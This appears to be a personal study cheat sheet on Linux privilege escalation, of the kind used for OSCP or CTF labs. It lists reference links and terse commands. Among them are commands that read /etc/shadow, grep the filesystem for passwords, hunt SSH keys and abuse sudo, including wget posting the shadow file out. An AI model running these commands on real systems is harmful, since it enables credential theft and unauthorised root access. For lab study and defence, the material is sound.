# References
- Basic Linux Privilege Escalation
	- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- Linux Privilege Escalation
	- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- Checklist - Linux Privilege Escalation
	- https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
- Sushant 747's Guide (Country dependant - may need VPN)
	- https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html
- GTFOBins
	- https://gtfobins.github.io/
- wget example
	- https://veteransec.com/2018/09/29/hack-the-box-sunday-walkthrough/
- Nginx Exploit
	- https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
- Linux Privilege Escalation using Capabilities
	- https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
- SUID vs Capabilities
	- https://mn3m.info/posts/suid-vs-capabilities/
- Linux Capabilities Privilege Escalation
	- https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099
- LinPEAS
	- https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
- Linux PrivE Playground
	- https://tryhackme.com/room/privescplayground)

  

# Initial Enum
- system enum
- hostname
- uname -a
- lscpu
- ps aux
- user enum
- whoami
- id
- sudo -l
- sudo nano
- cat etc/passwd
- cat etc/passwd | cut -d : -f 1
- cat etc/shadow
- cat etc/group
- history
- network enum
- ifconfig
- ip a
- ip route
- netstat -ano
- password hunting
- grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null

# Password & File Escalation
- bash_history contains password
- weak password & file perms
- ssh keygen
- id_rsa
- authorized_keys
- login as root
- .ssh authorized keys

# Sudo
- sudo -l
- GTFO Bins
- sudo apache2 -f /etc/shadow
- sudo wget --post -file=/etc/shadow
- LD_PRELOAD

  
# SUID (Set User ID)
- find / -perm -u=s -type f 2>/dev/null
- GTFO BINS SUID cmd

  
# Docker
- GTFO Bin